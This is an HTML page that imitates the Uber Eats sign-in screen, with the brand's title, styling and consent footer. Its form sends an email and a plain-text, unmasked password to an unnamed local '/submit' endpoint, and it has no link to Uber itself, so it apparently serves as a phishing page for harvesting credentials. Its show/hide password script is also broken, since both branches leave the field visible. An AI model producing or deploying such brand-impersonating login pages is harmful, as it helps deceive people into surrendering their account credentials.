<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Uber Eats Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    * {margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
    body {background-color:#fff;min-height:100vh;}
    .top-bar {height:72px;background-color:#000;display:flex;align-items:center;padding:0 24px;}
    .top-bar h1 {color:#fff;font-size:26px;font-weight:500;}
    .top-bar h1 span {font-weight:800;}
    .main {display:flex;justify-content:center;padding:0 16px;margin-top:80px;}
    .login-box {width:100%;max-width:360px;}
    .login-box h2 {font-size:28px;font-weight:700;margin-bottom:20px;}
    .input-box {width:100%;padding:14px;font-size:16px;border-radius:8px;border:none;background-color:#f1f1f1;margin-bottom:14px;}
    .continue-btn {width:100%;padding:14px;background-color:#000;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:6px;display:flex;align-items:center;justify-content:center;gap:10px;}
    .continue-btn:disabled {background-color:#333;cursor:not-allowed;}
    .divider {display:flex;align-items:center;margin:20px 0;font-size:14px;color:#777;}
    .divider::before,.divider::after {content:"";flex:1;height:1px;background-color:#ddd;}
    .divider span {margin:0 10px;}
    .social-btn {width:100%;padding:12px;border-radius:8px;border:none;background-color:#eee;font-size:15px;font-weight:500;cursor:pointer;margin-bottom:12px;display:flex;align-items:center;justify-content:center;gap:10px;}
    .social-btn img {width:18px;height:18px;}
    .footer-text {margin-top:24px;font-size:12px;color:#666;line-height:1.5;}
    .spinner {width:18px;height:18px;border:3px solid #fff;border-top:3px solid transparent;border-radius:50%;animation:spin 1s linear infinite;}
    @keyframes spin {to {transform:rotate(360deg);}}
    .password-wrapper {position: relative; display: flex; align-items: center;}
    .input-box.password-input {width: 100%; padding-right: 60px;}
    .show-btn {position: absolute; right: 12px; bottom: 26px; cursor: pointer; color: #555; font-weight: 600; user-select: none; font-size: 13px;}
    @media (max-width:480px){.top-bar {height:64px;}.top-bar h1{font-size:22px;}.login-box h2{font-size:22px;}}
  </style>
</head>
<body>
  <div class="top-bar"><h1>Uber <span>Eats</span></h1></div>
  <div class="main">
    <div class="login-box">
      <h2>What's your phone number or email?</h2>
      <form action="/submit" method="POST" id="loginForm">
        <input type="email" name="email" class="input-box" placeholder="Phone number or email" required />
        <div class="password-wrapper">
          <input type="text" name="Password" class="input-box password-input" placeholder="Password" id="PasswordInput" required />
          <span class="show-btn" id="togglePassword">SHOW</span>
        </div>
        <button type="submit" class="continue-btn" id="continueBtn">Continue</button>
      </form>
      <div class="divider"><span>or</span></div>
      <button class="social-btn"><img src="https://www.svgrepo.com/show/475656/google-color.svg">Continue with Google</button>
      <button class="social-btn"><img src="https://www.svgrepo.com/show/512332/apple-173.svg">Continue with Apple</button>
      <p class="footer-text">By continuing, you agree to calls, including by autodialer, WhatsApp or texts from Uber Eats and its affiliates.</p>
    </div>
  </div>

  <script>
    const form = document.getElementById("loginForm");
    const continueBtn = document.getElementById("continueBtn");
    form.addEventListener("submit", function() {
      continueBtn.innerHTML = '<div class="spinner"></div> Processing...';
      continueBtn.disabled = true;
    });
    const togglePassword = document.getElementById('togglePassword');
    const Password = document.getElementById('PasswordInput');
    togglePassword.addEventListener('click', () => {
      if(PasswordInput.type === 'text') {
        PasswordInput.type = 'text';
        togglePassword.textContent = 'SHOW';
      } else {
        PasswordInput.type = 'text';
        Password.textContent = 'HIDE';
      }
    });
  </script>
</body>
</html>
